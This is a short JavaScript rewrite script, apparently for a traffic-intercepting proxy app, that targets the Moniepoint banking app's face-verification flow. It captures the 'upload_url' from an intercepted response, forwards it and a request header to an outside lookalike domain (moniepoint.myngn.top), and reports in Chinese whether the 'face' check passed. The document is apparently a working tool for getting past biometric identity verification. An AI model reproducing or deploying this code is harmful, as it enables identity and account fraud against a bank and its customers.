let body = $response.body;
let obj = JSON.parse(body);
let upload_url = obj.upload_url;
let headers = $request.headers;


function sendPostRequest() {
    let myRequest = {
        url: 'https://moniepoint.myngn.top/api/receive_data',
        method: 'POST',
        headers: {
            "Host": "moniepoint.myngn.top",
            "Content-Type": "application/json",
            "code": headers.code
        },
        body: JSON.stringify({"upload_url": upload_url}),
        timeout: 60
    };


    $task.fetch(myRequest).then(response => {
        if (response.statusCode === 200 || response.statusCode === "200") {
            $notify("Moniepoint", "人脸通过", "");
            $done({});
        } else if (response.statusCode === 404 || response.statusCode === "404") {
            // 重新发送POST请求
            sendPostRequest();
        } else {
            $notify("Moniepoint", "人脸失败", "");
            $done({});
        }
    }).reason(error => {
        $notify("Moniepoint", "人脸失败", "未知错误");
        $done({});
    });
}


if (upload_url) {
    sendPostRequest();
} else {
    $notify("Moniepoint", "人脸失败", "");
    $done({});
}
